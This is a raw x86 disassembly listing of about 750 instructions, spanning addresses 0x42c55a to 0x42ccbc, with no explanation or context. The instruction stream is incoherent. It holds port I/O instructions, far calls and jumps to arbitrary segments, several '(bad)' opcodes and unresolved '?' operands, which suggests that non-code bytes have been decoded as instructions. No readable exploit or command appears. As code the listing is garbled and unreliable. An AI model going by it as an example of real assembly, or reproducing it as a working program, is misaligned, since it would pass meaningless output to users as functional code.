  42c55a:	scas   eax,DWORD PTR es:[edi]
  42c55b:	out    0xcd,al
  42c55d:	mov    al,ds:0xe76fda0b
  42c562:	aas    
  42c563:	ja     0x42c590
  42c565:	xor    al,0xdc
  42c567:	out    0xb2,al
  42c569:	retf   0x84b0
  42c56c:	sbb    eax,0x351e38f4
  42c571:	fs or  ecx,ebp
  42c574:	aam    0xfa
  42c576:	call   0x8a8d:0x32e9adad
  42c57d:	mov    ds:0x212447eb,eax
  42c582:	mov    esp,0x6238e51f
  42c587:	cld    
  42c588:	jno    0x42c54e
  42c58a:	pop    eax
  42c58b:	and    al,0x43
  42c58d:	daa    
  42c58e:	mul    DWORD PTR [ecx+esi*2+0x60]
  42c592:	mov    ebx,0x53e144c4
  42c597:	mov    edx,0x2f30d1d6
  42c59c:	call   0xd6b9:0x8923
  42c5a2:	retf   
  42c5a3:	cmp    al,0x71
  42c5a5:	bound  esi,QWORD PTR [esi-0x4648c1cc]
  42c5ab:	and    DWORD PTR [ebp+0x7f],0x42
  42c5af:	icebp  
  42c5b0:	adc    dh,dl
  42c5b2:	div    BYTE PTR [eax+0x16]
  42c5b5:	leave  
  42c5b6:	mov    esi,0xc369b216
  42c5bb:	out    dx,eax
  42c5bc:	das    
  42c5bd:	mov    ds:0x1b62b36b,eax
  42c5c2:	jae    0x42c569
  42c5c4:	inc    edi
  42c5c5:	add    dh,0x3d
  42c5c8:	jecxz  0x42c5b9
  42c5ca:	mov    cl,0x64
  42c5cc:	jmp    0x3729f99b
  42c5d1:	outs   dx,DWORD PTR ds:[esi]
  42c5d2:	push   cs
  42c5d3:	iret   
  42c5d4:	mov    dh,BYTE PTR [ebx-0x3a]
  42c5d7:	adc    edi,DWORD PTR [ebx]
  42c5d9:	int3   
  42c5da:	test   al,0xe9
  42c5dc:	and    eax,0xa18025a9
  42c5e1:	gs jge 0x42c64e
  42c5e4:	adc    eax,0xefa22ba9
  42c5e9:	push   ds
  42c5ea:	loopne 0x42c59c
  42c5ec:	jl     0x42c5ef
  42c5ee:	div    bl
  42c5f0:	or     bh,0xbc
  42c5f3:	jo     0x42c624
  42c5f5:	sti    
  42c5f6:	jb     0x42c672
  42c5f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c5f9:	xchg   ecx,eax
  42c5fa:	clc    
  42c5fb:	out    dx,al
  42c5fc:	cmp    al,0x5
  42c5fe:	or     al,0x14
  42c600:	sbb    BYTE PTR [ecx+0x5a8b2c7d],cl
  42c606:	rol    BYTE PTR [edx-0xf2a026],0x3f
  42c60d:	popf   
  42c60e:	aas    
  42c60f:	hlt    
  42c610:	jbe    0x42c5ee
  42c612:	nop
  42c613:	test   al,0x23
  42c615:	mov    ecx,0x46adc75
  42c61a:	out    0xd3,al
  42c61c:	lods   eax,DWORD PTR ds:[esi]
  42c61d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c61e:	imul   edx,esi,0x3d
  42c621:	pop    edi
  42c622:	cmp    eax,0x98f56c59
  42c627:	int3   
  42c628:	adc    esp,DWORD PTR [ebx-0x17e1db4c]
  42c62e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c62f:	pop    es
  42c630:	jns    0x42c63f
  42c632:	mov    fs,WORD PTR gs:[ecx-0x10]
  42c636:	shl    esp,0xad
  42c639:	arpl   WORD PTR [eax+0x61],di
  42c63c:	pop    ss
  42c63d:	mov    DWORD PTR [edx+ebx*2+0x608da77],eax
  42c644:	inc    edx
  42c645:	mov    DWORD PTR [ebp+ecx*4+0x39f7bbd2],ebx
  42c64c:	shl    BYTE PTR [ebp-0x76eadedb],1
  42c652:	rcr    BYTE PTR ds:0x75423f43,1
  42c658:	popf   
  42c659:	xor    eax,0xa109ed1b
  42c65e:	imul   edi,DWORD PTR [edx],0x29
  42c661:	jb     0x42c5ee
  42c663:	or     edi,DWORD PTR [ebx-0x64]
  42c666:	std    
  42c667:	mov    eax,0x9c64f920
  42c66c:	xor    al,BYTE PTR [ebx+0x19]
  42c66f:	jp     0x42c613
  42c671:	fimul  WORD PTR [ecx+edx*4-0x3d652548]
  42c678:	push   esp
  42c679:	push   esi
  42c67a:	loopne 0x42c610
  42c67c:	popf   
  42c67d:	jae    0x42c6e4
  42c67f:	push   esi
  42c680:	sbb    al,0x59
  42c682:	fild   WORD PTR [ebp-0xcd417c6]
  42c688:	cpuid  
  42c68a:	or     ebx,DWORD PTR [ecx+ebx*8]
  42c68d:	cmp    cl,BYTE PTR [eax-0x6c66b71c]
  42c693:	mov    eax,0x44bdb36d
  42c698:	(bad)  
  42c699:	retf   0x9d43
  42c69c:	xchg   ebp,eax
  42c69d:	test   eax,0x91f4f2ba
  42c6a2:	lahf   
  42c6a3:	pushw  ds
  42c6a5:	cdq    
  42c6a6:	mov    ebp,0xccc951ae
  42c6ab:	stos   BYTE PTR es:[edi],al
  42c6ac:	push   ss
  42c6ad:	sahf   
  42c6ae:	mov    ebx,0x8aa76f31
  42c6b3:	into   
  42c6b4:	jbe    0x42c67b
  42c6b6:	push   ebx
  42c6b7:	gs pop esi
  42c6b9:	sbb    ebp,DWORD PTR [eax]
  42c6bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c6bc:	dec    ebp
  42c6bd:	pop    esi
  42c6be:	and    eax,0xe2c8f1a1
  42c6c3:	jo     0x42c68a
  42c6c5:	dec    esi
  42c6c6:	push   es
  42c6c7:	out    0x5e,al
  42c6c9:	sbb    eax,0x2b14785a
  42c6ce:	out    0x15,al
  42c6d0:	or     ecx,DWORD PTR [edi+0x64]
  42c6d3:	(bad)  
  42c6d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c6d5:	(bad)  
  42c6d6:	mov    edx,0x4b9e4774
  42c6db:	adc    DWORD PTR [esp+edx*8],ecx
  42c6de:	mov    ds:0x1a9630a0,al
  42c6e3:	xor    BYTE PTR [edx-0x367b4a90],0xbe
  42c6ea:	hlt    
  42c6eb:	mov    al,0x85
  42c6ed:	sub    ecx,edx
  42c6ef:	jmp    0x6cac2d7b
  42c6f4:	pop    eax
  42c6f5:	stc    
  42c6f6:	fdiv   DWORD PTR [edi+0x52f66327]
  42c6fc:	test   BYTE PTR [edi+esi*4+0x60],dh
  42c700:	std    
  42c701:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c702:	fwait
  42c703:	push   ds
  42c704:	shl    edx,0x47
  42c707:	lahf   
  42c708:	imul   edx,DWORD PTR [ecx-0xe],0xbf0408c3
  42c70f:	xchg   esp,eax
  42c710:	out    dx,eax
  42c711:	(bad)  
  42c713:	loop   0x42c6cb
  42c715:	dec    esp
  42c716:	jne    0x42c779
  42c718:	pop    esp
  42c719:	or     eax,0xb8985f46
  42c71e:	imul   ebp,eax,0x20
  42c721:	fstp   DWORD PTR [ebp-0x4f]
  42c724:	xor    ch,BYTE PTR [ebx+0x24]
  42c727:	repz push ebp
  42c729:	mov    eax,ds:0xcebd795b
  42c72e:	xchg   BYTE PTR [eax+0x7],cl
  42c731:	into   
  42c732:	ja     0x42c71d
  42c734:	mov    ah,0x57
  42c736:	mov    eax,0x5c7cdf24
  42c73b:	jno    0x42c703
  42c73d:	pop    ds
  42c73e:	jmp    DWORD PTR [ebx]
  42c740:	sbb    eax,edi
  42c742:	push   cs
  42c743:	dec    edi
  42c744:	push   ebp
  42c745:	mov    ds:0x9a28213c,al
  42c74a:	fs hlt 
  42c74c:	gs dec eax
  42c74e:	mov    ecx,0x2ee49a34
  42c753:	inc    eax
  42c754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c755:	aas    
  42c756:	fcomip st,st(2)
  42c758:	out    0xf0,al
  42c75a:	lea    edx,[edx+ebx*1+0x9]
  42c75e:	mov    edx,0xe9339fbe
  42c763:	push   eax
  42c764:	ficomp DWORD PTR [edx-0xd0c33c5]
  42c76a:	stos   DWORD PTR es:[edi],eax
  42c76b:	addr16 jmp 0x42c70c
  42c76e:	mov    es,esi
  42c770:	and    edi,DWORD PTR [ecx]
  42c772:	inc    edi
  42c773:	mov    WORD PTR [edi],?
  42c775:	sub    BYTE PTR [edi+0x4ba5c66b],bl
  42c77b:	push   edi
  42c77c:	outs   dx,DWORD PTR ds:[esi]
  42c77d:	outs   dx,DWORD PTR ds:[esi]
  42c77e:	dec    ebp
  42c77f:	inc    ecx
  42c780:	aad    0x10
  42c782:	xchg   eax,ebx
  42c784:	sbb    eax,0x6a34bb1a
  42c789:	mov    ah,0xce
  42c78b:	test   DWORD PTR ds:0x61eb1b14,edx
  42c791:	mov    ebx,0x59237bc8
  42c796:	lods   al,BYTE PTR ds:[esi]
  42c797:	push   ecx
  42c798:	retf   
  42c799:	mov    ds:0x30239390,eax
  42c79e:	outs   dx,DWORD PTR ds:[esi]
  42c79f:	hlt    
  42c7a0:	lahf   
  42c7a1:	in     al,dx
  42c7a2:	sub    BYTE PTR [ecx],0x72
  42c7a5:	call   0xbdec6462
  42c7aa:	test   BYTE PTR [ebx+ebx*1+0x49],bl
  42c7ae:	cmp    eax,0xb4a932c4
  42c7b3:	mov    esp,0x450a9f68
  42c7b8:	mov    ch,0x1f
  42c7ba:	add    al,0xf1
  42c7bc:	cmp    BYTE PTR [ecx],dh
  42c7be:	add    BYTE PTR [esi-0x6955e6d4],dh
  42c7c4:	dec    ebp
  42c7c5:	xchg   BYTE PTR [ecx-0x70],dh
  42c7c8:	pop    ss
  42c7c9:	imul   ecx,DWORD PTR ds:0x16f5e80c,0xffffffd4
  42c7d0:	push   ebp
  42c7d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c7d2:	ret    0x9e9
  42c7d5:	mov    al,0x9a
  42c7d7:	lods   al,BYTE PTR ds:[esi]
  42c7d8:	(bad)  [ebx-0x44]
  42c7db:	inc    esp
  42c7dc:	clc    
  42c7dd:	jb     0x42c792
  42c7df:	push   0xef51b585
  42c7e4:	icebp  
  42c7e5:	enter  0xd2bd,0x34
  42c7e9:	sub    DWORD PTR [edi+0x3],esi
  42c7ec:	fistp  WORD PTR [esi]
  42c7ee:	imul   ebx,ebx,0xc871df25
  42c7f4:	gs cmp eax,0x4628fdb2
  42c7fa:	aam    0x28
  42c7fc:	xchg   edx,eax
  42c7fd:	and    ah,BYTE PTR [ebx+0x2d]
  42c800:	jle    0x42c7be
  42c802:	not    ch
  42c804:	jmp    0x4cb293a5
  42c809:	in     al,0x56
  42c80b:	rcr    BYTE PTR [esi+0x4647b30c],cl
  42c811:	push   ebp
  42c812:	imul   ebx,esp,0x2
  42c815:	shl    BYTE PTR [esi-0x45],0x7c
  42c819:	or     al,0xb1
  42c81b:	pop    esp
  42c81c:	push   edx
  42c81d:	test   eax,0x1cf44db1
  42c822:	fldenv [edi+0x701c648e]
  42c828:	arpl   WORD PTR [bx+si-0x6ae6],sp
  42c82d:	mov    ch,0x4e
  42c82f:	stc    
  42c830:	shl    BYTE PTR [eax+ecx*2-0x23],1
  42c834:	or     ebp,DWORD PTR [edx+0x58]
  42c837:	test   BYTE PTR [ecx-0x68e7785f],bl
  42c83d:	pushf  
  42c83e:	jl     0x42c841
  42c840:	inc    ebp
  42c841:	push   edx
  42c842:	push   0xe2d172e8
  42c847:	or     BYTE PTR [eax],ah
  42c849:	or     DWORD PTR [eax],esp
  42c84b:	fstp   QWORD PTR [esi]
  42c84d:	xor    DWORD PTR [eax-0x68],0xffffffbc
  42c851:	pop    esi
  42c852:	pop    ebp
  42c853:	es pop ss
  42c855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c856:	mov    ebx,DWORD PTR [eax+0x53]
  42c859:	jmp    0x42c883
  42c85b:	cwde   
  42c85c:	and    al,0xe9
  42c85e:	sti    
  42c85f:	mov    bh,0xe8
  42c861:	push   esp
  42c862:	pop    esi
  42c863:	lock mov bh,0xa6
  42c866:	sti    
  42c867:	xchg   esp,eax
  42c868:	mov    dl,0x90
  42c86a:	sub    ebx,ebx
  42c86c:	fnstsw WORD PTR [ebp+0x1c]
  42c86f:	or     eax,0x44b11401
  42c874:	clc    
  42c875:	pop    es
  42c876:	rol    BYTE PTR [esi+eiz*8+0x1b5ae15f],cl
  42c87d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c87e:	lock or DWORD PTR [ecx+0x22],esi
  42c882:	and    BYTE PTR [edi+eax*2+0x45],ah
  42c886:	jecxz  0x42c85c
  42c888:	scas   eax,DWORD PTR es:[edi]
  42c889:	sub    BYTE PTR [ebx-0x545d4a0f],cl
  42c88f:	popf   
  42c890:	in     eax,dx
  42c891:	stos   DWORD PTR es:[edi],eax
  42c892:	push   ebx
  42c893:	sbb    DWORD PTR [ebx-0x4d],ecx
  42c896:	xchg   esp,eax
  42c897:	sub    eax,DWORD PTR [esi-0x5c08c64d]
  42c89d:	mov    esp,0x3e1d84ba
  42c8a2:	dec    edx
  42c8a3:	out    dx,al
  42c8a4:	out    0xee,al
  42c8a6:	xchg   BYTE PTR [ecx],ah
  42c8a8:	adc    al,0x3f
  42c8aa:	and    DWORD PTR [eax],ebp
  42c8ac:	inc    ebp
  42c8ad:	aam    0xb5
  42c8af:	add    edx,ebx
  42c8b1:	gs mov ecx,0xd43a83d4
  42c8b7:	enter  0x6317,0x68
  42c8bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c8bc:	adc    eax,0x33f23a2d
  42c8c1:	call   0x34ba:0x101f61ac
  42c8c8:	fwait
  42c8c9:	pop    ebp
  42c8ca:	repnz adc BYTE PTR [ebp+0x56],dl
  42c8ce:	dec    edi
  42c8cf:	repnz mov ch,0xcb
  42c8d2:	xchg   esp,eax
  42c8d3:	xchg   BYTE PTR [ebx],bl
  42c8d5:	cdq    
  42c8d6:	push   ebx
  42c8d7:	mov    cl,0x19
  42c8d9:	mov    ah,0xf
  42c8db:	cs push ss
  42c8dd:	popf   
  42c8de:	imul   ecx,ecx,0x54
  42c8e1:	mov    esp,0xac757e36
  42c8e6:	je     0x42c914
  42c8e8:	push   0xfb54ba1a
  42c8ed:	in     al,dx
  42c8ee:	retf   0xf409
  42c8f1:	test   eax,0xf38aefbb
  42c8f6:	sub    DWORD PTR [ebx+0x2bde9299],edi
  42c8fc:	sbb    BYTE PTR [ebp-0x4a947c45],0x7b
  42c903:	out    0x99,eax
  42c905:	dec    edi
  42c906:	sub    eax,0xb3bcb237
  42c90b:	mov    ah,0x2f
  42c90d:	inc    ebx
  42c90e:	push   esp
  42c90f:	loop   0x42c89a
  42c911:	aam    0x43
  42c913:	xchg   ebx,eax
  42c914:	loope  0x42c897
  42c916:	mov    ebp,0x2af69e94
  42c91b:	sub    BYTE PTR [esi],bh
  42c91d:	mov    al,0x83
  42c91f:	call   0x9e0fc73d
  42c924:	push   ss
  42c925:	pop    ebx
  42c926:	cli    
  42c927:	jb     0x42c97e
  42c929:	out    0x66,al
  42c92b:	jmp    0x42c8b1
  42c92d:	or     edi,ecx
  42c92f:	sbb    ch,BYTE PTR [edx]
  42c931:	pop    ecx
  42c932:	ins    BYTE PTR es:[edi],dx
  42c933:	stos   BYTE PTR es:[edi],al
  42c934:	fs inc eax
  42c936:	data16 std 
  42c938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c939:	idiv   esi
  42c93b:	jbe    0x42c8ea
  42c93d:	lahf   
  42c93e:	mov    ebx,0xdb32f781
  42c943:	fs jmp 0x42c9b1
  42c946:	push   esp
  42c947:	ss jno 0x42c99c
  42c94a:	mov    ah,0x29
  42c94c:	pusha  
  42c94d:	push   eax
  42c94e:	push   ss
  42c94f:	hlt    
  42c950:	repnz test al,0x19
  42c953:	xchg   esi,eax
  42c954:	add    edi,edi
  42c956:	mov    ch,0x34
  42c958:	fcmovne st,st(7)
  42c95a:	mov    ds:0xb99a4e6,al
  42c95f:	int    0x13
  42c961:	(bad)  
  42c962:	adc    BYTE PTR [eax-0x19],ah
  42c965:	dec    ebp
  42c967:	gs dec ebx
  42c969:	sahf   
  42c96a:	cmp    ecx,DWORD PTR [edx-0xb6c850]
  42c970:	jg     0x42c90f
  42c972:	fwait
  42c973:	cmp    DWORD PTR [edx+0x6a],edx
  42c976:	mov    edi,0xd1ceabef
  42c97b:	cmp    BYTE PTR [esi],cl
  42c97d:	sub    eax,0x19f5a4bf
  42c982:	adc    bh,BYTE PTR [esi-0x7b]
  42c985:	xor    BYTE PTR [esi+ebp*8],ch
  42c988:	push   esi
  42c989:	adc    DWORD PTR [ebp+eiz*4+0x7488a939],0x35
  42c991:	xor    DWORD PTR [edx-0x5f],ebx
  42c994:	sar    DWORD PTR [esi-0x308a1b27],1
  42c99a:	or     al,bh
  42c99c:	xor    BYTE PTR [esi],bh
  42c99e:	jmp    0x4f1054b9
  42c9a3:	in     eax,0xa3
  42c9a5:	pop    esp
  42c9a6:	aas    
  42c9a7:	mov    ah,0x7
  42c9a9:	ror    BYTE PTR [edi-0x4d7fe637],cl
  42c9af:	pop    eax
  42c9b0:	jno    0x42c96a
  42c9b2:	mov    ebx,0x40ae5e07
  42c9b7:	xchg   DWORD PTR [ebp+0x314177e8],ebp
  42c9bd:	fstp   DWORD PTR [edx]
  42c9bf:	inc    ebp
  42c9c0:	pop    ebx
  42c9c1:	adc    eax,0xd0255aef
  42c9c6:	inc    edi
  42c9c7:	scas   eax,DWORD PTR es:[edi]
  42c9c8:	mov    DWORD PTR [ecx-0x39ff51f0],esi
  42c9ce:	mov    eax,0xdd56abec
  42c9d3:	out    dx,eax
  42c9d4:	sbb    DWORD PTR [edx-0x13],edi
  42c9d7:	xor    al,0x43
  42c9d9:	and    eax,0x3f7cf6da
  42c9de:	sub    esp,DWORD PTR [esi+0x46]
  42c9e1:	mov    ecx,0xa3100703
  42c9e6:	lea    edi,[eax]
  42c9e8:	ds pushf 
  42c9ea:	sub    bh,BYTE PTR ds:0xadded3ca
  42c9f0:	add    edi,DWORD PTR [edx-0x4ad51b31]
  42c9f6:	sub    al,BYTE PTR [ecx-0x3e]
  42c9f9:	mov    ds:0x9b7733bb,eax
  42c9fe:	inc    eax
  42c9ff:	jmp    0xfbaf:0xb94a9994
  42ca06:	adc    dh,ch
  42ca08:	(bad)  
  42ca09:	shr    ah,cl
  42ca0b:	and    eax,ecx
  42ca0d:	jl     0x42c9db
  42ca0f:	cmp    al,0x53
  42ca11:	push   edi
  42ca12:	sbb    edx,DWORD PTR [ebx+0x3e8d52a2]
  42ca18:	sbb    bl,BYTE PTR [ecx]
  42ca1a:	fwait
  42ca1b:	sti    
  42ca1c:	push   cs
  42ca1d:	std    
  42ca1e:	fiadd  DWORD PTR [ecx]
  42ca20:	push   esp
  42ca21:	mov    al,ds:0x52d9bc9b
  42ca26:	push   ecx
  42ca27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ca28:	js     0x42c9db
  42ca2a:	mov    al,0xa6
  42ca2c:	and    ebx,DWORD PTR [ecx]
  42ca2e:	ss sbb al,0x7d
  42ca31:	xchg   ebp,eax
  42ca32:	xor    DWORD PTR [ebp-0x14],0xffffff9e
  42ca36:	fwait
  42ca37:	jns    0x42cab3
  42ca39:	push   eax
  42ca3a:	inc    esp
  42ca3b:	das    
  42ca3c:	loopne 0x42ca70
  42ca3e:	lds    eax,FWORD PTR [esi+0x24c608c4]
  42ca44:	fnsave [esi+0x18e4fc8b]
  42ca4a:	ret    
  42ca4b:	inc    esi
  42ca4c:	push   ebp
  42ca4d:	cmp    DWORD PTR [edx-0x13],esi
  42ca50:	dec    ebx
  42ca51:	ds push ds
  42ca53:	data16 and BYTE PTR [ecx],bl
  42ca56:	clc    
  42ca57:	int    0x69
  42ca59:	dec    edx
  42ca5a:	out    dx,eax
  42ca5b:	std    
  42ca5c:	dec    esp
  42ca5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca5e:	fwait
  42ca5f:	les    edi,FWORD PTR [edi+0x58]
  42ca62:	xor    eax,0x2d085263
  42ca67:	scas   eax,DWORD PTR es:[edi]
  42ca68:	push   esi
  42ca69:	cs in  al,0x84
  42ca6c:	mov    DWORD PTR [ecx],esp
  42ca6e:	or     esp,esp
  42ca70:	das    
  42ca71:	pushf  
  42ca72:	pop    ebx
  42ca73:	lea    esi,[ecx+0x1c]
  42ca76:	outs   dx,DWORD PTR ds:[esi]
  42ca77:	mov    al,BYTE PTR [eax-0x34f4f5f8]
  42ca7d:	pop    ds
  42ca7e:	mov    ebp,0x7d1818e4
  42ca83:	jns    0x42ca3a
  42ca85:	nop
  42ca86:	jo     0x42ca7a
  42ca88:	scas   eax,DWORD PTR es:[edi]
  42ca89:	sub    al,0x80
  42ca8b:	mov    ds,WORD PTR [esi]
  42ca8d:	sub    esp,ecx
  42ca8f:	je     0x42ca4f
  42ca91:	sub    eax,0x999a5efa
  42ca96:	jmp    0x42caf2
  42ca98:	lock cmc 
  42ca9a:	mov    eax,0xb18f7859
  42ca9f:	test   al,0x66
  42caa1:	outs   dx,DWORD PTR ds:[esi]
  42caa2:	mov    esi,0x824781b4
  42caa7:	sub    BYTE PTR [ebp-0x42],ah
  42caaa:	imul   esp
  42caac:	cli    
  42caad:	aam    0x72
  42caaf:	mov    ah,0x18
  42cab1:	jmp    0x9ddc13c9
  42cab6:	cmp    BYTE PTR [ebp-0x12],bl
  42cab9:	mov    ds:0x1f70818b,eax
  42cabe:	cld    
  42cabf:	iret   
  42cac0:	mov    bh,0xbd
  42cac2:	aaa    
  42cac3:	push   esp
  42cac4:	fcom   QWORD PTR [ecx]
  42cac6:	lods   al,BYTE PTR ds:[esi]
  42cac7:	clc    
  42cac8:	jbe    0x42ca73
  42caca:	stc    
  42cacb:	adc    ebx,eax
  42cacd:	sbb    DWORD PTR [edi+0x7bf8e674],edi
  42cad3:	fcomp  DWORD PTR [ebx]
  42cad5:	or     DWORD PTR [ecx-0x2b7ff72f],0xe05f778e
  42cadf:	fs dec edi
  42cae1:	mov    ds:0x1801bd27,al
  42cae6:	repz loop 0x42ca88
  42cae9:	pop    eax
  42caea:	pop    ds
  42caeb:	push   0x23
  42caed:	jno    0x42cad3
  42caef:	mov    gs,ecx
  42caf1:	dec    ebx
  42caf2:	leave  
  42caf3:	xchg   edx,eax
  42caf4:	and    cl,BYTE PTR [ecx]
  42caf6:	sbb    DWORD PTR [ebp+0x73],edx
  42caf9:	xchg   edx,eax
  42cafa:	xlat   BYTE PTR ds:[ebx]
  42cafb:	push   ecx
  42cafc:	add    bl,BYTE PTR [ebx+0x557687db]
  42cb02:	lods   eax,DWORD PTR ds:[esi]
  42cb03:	add    eax,0xd7400124
  42cb08:	sti    
  42cb09:	add    DWORD PTR [esp+esi*8-0x12706089],esi
  42cb10:	xor    eax,0x21eb87e0
  42cb15:	adc    BYTE PTR [esi-0xf],al
  42cb18:	cdq    
  42cb19:	mov    edx,0xfe5db3d3
  42cb1e:	add    ecx,DWORD PTR [edx+0x25]
  42cb21:	stos   DWORD PTR es:[edi],eax
  42cb22:	jnp    0x42cb29
  42cb24:	ret    0xc96b
  42cb27:	sti    
  42cb28:	sbb    DWORD PTR [ecx],esp
  42cb2a:	sub    DWORD PTR [ebx-0x80],esp
  42cb2d:	mov    ch,BYTE PTR [ecx-0x40]
  42cb30:	and    DWORD PTR [ecx-0x2f882a1d],ebp
  42cb36:	xlat   BYTE PTR ds:[ebx]
  42cb37:	xor    DWORD PTR [ebp+0x44],esp
  42cb3a:	int    0xe4
  42cb3c:	stc    
  42cb3d:	pop    ss
  42cb3e:	fnstcw WORD PTR [edi+eax*4]
  42cb41:	mov    ecx,0xcd926afb
  42cb46:	pop    ebp
  42cb47:	loope  0x42cb81
  42cb49:	aad    0xbe
  42cb4b:	iret   
  42cb4c:	add    eax,0xcdf0620c
  42cb51:	pop    eax
  42cb52:	lods   al,BYTE PTR ds:[esi]
  42cb53:	pushf  
  42cb54:	push   ss
  42cb55:	mov    ecx,0x5c9722c8
  42cb5a:	and    BYTE PTR [ebp-0x34645705],ah
  42cb60:	ret    0x6506
  42cb63:	xchg   BYTE PTR [esi-0x65],dl
  42cb66:	test   edx,ecx
  42cb68:	aas    
  42cb69:	test   al,0xbe
  42cb6b:	mov    ah,0x21
  42cb6d:	sub    bh,BYTE PTR [edi]
  42cb6f:	mov    eax,DWORD PTR [ebp+0x17eaa562]
  42cb75:	sbb    ebx,DWORD PTR [ecx]
  42cb77:	sbb    DWORD PTR gs:[ecx],ecx
  42cb7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cb7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb7c:	mov    ?,WORD PTR [ebx-0x13]
  42cb7f:	ret    0x5068
  42cb82:	out    dx,eax
  42cb83:	add    BYTE PTR [edi-0x55ee7ebf],al
  42cb89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb8a:	mov    ah,0x7e
  42cb8c:	mov    al,ds:0xb2e79ec4
  42cb91:	loop   0x42cb2e
  42cb93:	test   al,0xf1
  42cb95:	mov    bl,0x6
  42cb97:	xchg   DWORD PTR [edx+0x1e8ccaee],esp
  42cb9d:	call   0x68a2:0x955460fb
  42cba4:	and    eax,0xa7c928bf
  42cba9:	xor    al,0xb6
  42cbab:	inc    esp
  42cbac:	jne    0x42cb89
  42cbae:	repz imul esi,ebp,0xd6e77c0d
  42cbb5:	(bad)  
  42cbb6:	lahf   
  42cbb7:	and    ch,BYTE PTR gs:[ecx-0x20]
  42cbbb:	pop    es
  42cbbc:	mov    ds:0x61207546,al
  42cbc1:	loop   0x42cb4e
  42cbc3:	out    dx,al
  42cbc4:	push   0xffffffbb
  42cbc6:	or     DWORD PTR [edx-0x145905a3],ebp
  42cbcc:	pop    ds
  42cbcd:	cdq    
  42cbce:	scas   al,BYTE PTR es:[edi]
  42cbcf:	jne    0x42cb6c
  42cbd1:	mov    eax,DWORD PTR [edi]
  42cbd3:	dec    ebx
  42cbd4:	pop    edx
  42cbd5:	push   ss
  42cbd6:	dec    esp
  42cbd7:	inc    eax
  42cbd8:	sub    cl,BYTE PTR [ebx]
  42cbda:	add    BYTE PTR [ecx],0x70
  42cbdd:	lds    edi,FWORD PTR [esi+ebp*8+0x7374fcc5]
  42cbe4:	fbstp  TBYTE PTR gs:[esi-0x13]
  42cbe8:	push   esi
  42cbe9:	sbb    cl,BYTE PTR [ecx]
  42cbeb:	cmp    BYTE PTR [edx],0x74
  42cbee:	xor    dh,BYTE PTR [ecx-0x6b4ea11a]
  42cbf4:	jl     0x42cc05
  42cbf6:	mov    ch,0x61
  42cbf9:	imul   ebp
  42cbfb:	xor    eax,0xc4bfa942
  42cc00:	fs pushf 
  42cc02:	stos   DWORD PTR es:[edi],eax
  42cc03:	push   edx
  42cc04:	enter  0x563a,0xf6
  42cc08:	in     al,dx
  42cc09:	shl    DWORD PTR [edi+0x2d],1
  42cc0c:	adc    eax,0x8ea4b0bc
  42cc11:	push   ebp
  42cc12:	sub    DWORD PTR [ebp+edx*1+0x10],0xbd6feb51
  42cc1a:	xchg   ebx,eax
  42cc1b:	xchg   BYTE PTR [ecx+edi*4],bl
  42cc1e:	jb     0x42cbfe
  42cc20:	les    eax,FWORD PTR [eax-0x60788bca]
  42cc26:	stos   DWORD PTR es:[edi],eax
  42cc27:	jg     0x42cc49
  42cc29:	mov    dh,0x33
  42cc2b:	sub    eax,0x137ea224
  42cc30:	push   ebx
  42cc31:	aas    
  42cc32:	mov    ah,0xd4
  42cc34:	or     cl,0xce
  42cc37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cc38:	test   esp,esp
  42cc3a:	jb     0x42cc23
  42cc3c:	jg     0x42ccb8
  42cc3e:	fnsave [ebx+0x4541f923]
  42cc44:	push   ecx
  42cc45:	ja     0x42cbfc
  42cc47:	inc    ebp
  42cc48:	sahf   
  42cc49:	xchg   ecx,eax
  42cc4a:	cld    
  42cc4b:	push   cs
  42cc4c:	aaa    
  42cc4d:	xor    BYTE PTR [edx],0xbc
  42cc50:	es mov ebp,0xf921f6be
  42cc56:	retf   0xf002
  42cc59:	cdq    
  42cc5a:	pop    es
  42cc5b:	js     0x42cc8c
  42cc5d:	mov    cl,0x72
  42cc5f:	sub    eax,0xff8e3d75
  42cc64:	int3   
  42cc65:	and    bl,bh
  42cc67:	and    eax,0xe6520fb8
  42cc6c:	mov    edx,esp
  42cc6e:	cwde   
  42cc6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cc70:	popa   
  42cc71:	popf   
  42cc72:	mov    ah,0xa8
  42cc74:	xor    BYTE PTR [ebx+0x3b],al
  42cc77:	mov    dh,0xc7
  42cc79:	mov    eax,ds:0xf561c6e9
  42cc7e:	scas   al,BYTE PTR es:[edi]
  42cc7f:	in     eax,dx
  42cc80:	inc    ebx
  42cc81:	adc    bh,BYTE PTR [ebx+eiz*4-0x30]
  42cc85:	jle    0x42cc3b
  42cc87:	in     al,0xec
  42cc89:	mov    esp,0xce04d2a9
  42cc8e:	imul   esp,DWORD PTR [ebp-0x334273dd],0xffffffa4
  42cc95:	xor    DWORD PTR [eax-0x36],ebx
  42cc98:	add    bl,bl
  42cc9a:	retf   
  42cc9b:	jmp    0x5951:0x1bf81dbe
  42cca2:	push   ebx
  42cca3:	test   al,bh
  42cca5:	dec    esp
  42cca6:	sub    dl,dh
  42cca8:	jb     0x42cc6e
  42ccaa:	jne    0x42cc9c
  42ccac:	in     eax,0x76
  42ccae:	inc    ebx
  42ccaf:	call   0x36ba7c72
  42ccb4:	sbb    bh,BYTE PTR [ecx]
  42ccb6:	xchg   ecx,eax
  42ccb7:	mov    bl,0xeb
  42ccb9:	mov    cl,0x13
  42ccbb:	pushf  
  42ccbc:	mov    ebx,0xdf174bd5
